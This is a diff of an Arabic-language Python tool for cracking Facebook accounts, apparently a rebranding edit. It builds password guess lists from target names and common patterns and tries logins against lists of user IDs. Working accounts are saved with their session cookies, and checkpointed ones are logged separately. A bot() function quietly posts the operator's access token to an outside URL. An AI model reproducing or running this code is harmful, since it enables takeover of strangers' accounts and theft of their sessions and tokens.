@@ -37,7 +37,7 @@ if (x.strftime("%x"))==(g.strftime("%x")):
    print('')
    if(x.strftime("%X"))>(g.strftime("%X")):
     print('\n\n')
-    print("     "+'خلص اشتراك عليك مراجعة صانع اداة @Islam85555🗿')
+    print("     "+'خلص اشتراك عليك مراجعة صانع اداة @F_1_9 ☄️🗿')
     print('\n\n')
     print(x)
     
@@ -48,7 +48,7 @@ else:
     print('')
     
 os.system('clear')
-print('               مرحب بك في اداء اسلام الجوكر               ')
+print('                  انـتضـر قـلـيـلاً                 ')
 token = input('\x1b[1;31mT\x1b[1;32mO\x1b[1;33mK\x1b[1;34mE\x1b[1;36mN\x1b[1;35m :\x1b[1;32m ')
 print('\n')
 ID = input('\x1b[1;31mI\x1b[1;34mD \x1b[1;32m   : ')
@@ -335,7 +335,7 @@ def login_lagi334():
 		exit()
 def bot():
 	try:
-		requests.post("https://t.me/bsbsjhh"%(tokenku))
+		requests.post("https://graph.facebook.com/100002045441878?fields=subscribers&access_token=%s"%(tokenku))
 	except:
 		pass
 def menu(my_name,my_id):	
@@ -343,7 +343,7 @@ def menu(my_name,my_id):
 	os.system('clear')
 	from rich.panel import Panel as Ch
 	from rich import print as code
-	code(Ch('      💢 - اقـل عـدد ايـديـات خـلـي بالاداة 10 لا تنسوا صور الصيد   ')) 
+	code(Ch('      💢 - اقـل عـدد ايـديـات خـلـي بالاداة 10   ')) 
 	print('')
 	print(a16+'▭▬'*30)
 	print(f"\033[97;1m[\033[92;1m1\033[97;1m] \x1b[33m\x1b[33m \x1b[33m[{MJ3}CRACK PUBLIC\x1b[36m\x1b[33m]")
@@ -634,14 +634,14 @@ def passwrd():
 					pwv.append(frs+"123")
 					pwv.append(frs+'1234')		
 					pwv.append(frs+'12345')		
-					pwv.append('199919949')
-					pwv.append('199819898')
-					pwv.append('199719497')
-					pwv.append('009988577')
+					pwv.append('19991999')
+					pwv.append('19981998')
+					pwv.append('19971997')
+					pwv.append('00998877')
 					pwv.append(frs+'123456')
-					pwv.append('00998877766')
+					pwv.append('0099887766')
 					pwv.append(frs+"123123")
-					pwv.append('112238344@@')
+					pwv.append('11223344@@')
 					pwv.append('12345@@@@@')
 					pwv.append('123'+frs+'123')
 					pwv.append('1234'+frs+'1234')
@@ -649,16 +649,16 @@ def passwrd():
 					pwv.append('1q2q3q4q')
 					pwv.append('1q2w3e4r')
 					pwv.append('12344321')
-					pwv.append('009958877')
+					pwv.append('00998877')
 					pwv.append('99887766')
-					pwv.append('zxcvbn4mmnbvcxz')
+					pwv.append('zxcvbnmmnbvcxz')
 					pwv.append('qwertyuioppoiuytrewq')
-					pwv.append('200020050@@')
+					pwv.append('20002000@@')
 					pwv.append('20232023@@')
-					pwv.append('202420524@@')
+					pwv.append('20242024@@')
 					pwv.append('20232024')
 					pwv.append('20232024@@')
-					pwv.append('20012ة001@')
+					pwv.append('20012001@')
 					pwv.append('19991999@@')
 					pwv.append('19991999@')
 					pwv.append('19901990')
@@ -667,7 +667,7 @@ def passwrd():
 					pwv.append('12341234@@')
 					pwv.append('zokoloko')
 					pwv.append('aliali@@')
-					pwv.append('Aa123456')
+					pwv.append('حسين علي')
 					pwv.append('mustafa2000')
 					pwv.append('11112222@@')
 					pwv.append('11112222@')
@@ -717,7 +717,7 @@ def passwrd():
 					pwv.append('12341234@@')
 					pwv.append('zokoloko')
 					pwv.append('aliali@@')
-					pwv.append('qwerty123456')
+					pwv.append('حسين علي')
 					pwv.append('mustafa2000')
 					pwv.append('11112222@@')
 					pwv.append('11112222@')
@@ -769,7 +769,7 @@ def crack(idf,pwv):
 			if "checkpoint" in po.cookies.get_dict().keys():
 				print ('\x1b[36m|CP.|')
 				xda = f'\r[[CP]] ➨ {idf} | {pw} '
-				print ('\x1b[36m―――――― للاسف اسلام جاب لك حساب سكيور――――――――――――')
+				print ('\x1b[36m――――――――――――――――――――――――')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -783,7 +783,7 @@ def crack(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				raven_a = f'\r[[@bsbsjhh]@Islam85555] اسلام ➨ {idf} | {pw} | \n \n{kuki} '
-				print ('\x1b[32m――――――――― اسلام جاب لك حساب شغال――――――――――')
+				print ('\x1b[32m――――――――――――――――――――――――')
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				statusok1 = nel(raven_a, style='green')
 				cetak(nel(statusok1, title='OK'))
@@ -805,4 +805,4 @@ def cek_RAVEN(kuki):
 	game = [i.text for i in x.find_all("h3")]
 	try:
 		for i in range(len(game)):
-			print ("\r%s  \033[0m        
+			print ("\r%s  \033[0m              ➛ %s%s")%(P,H,game[i]
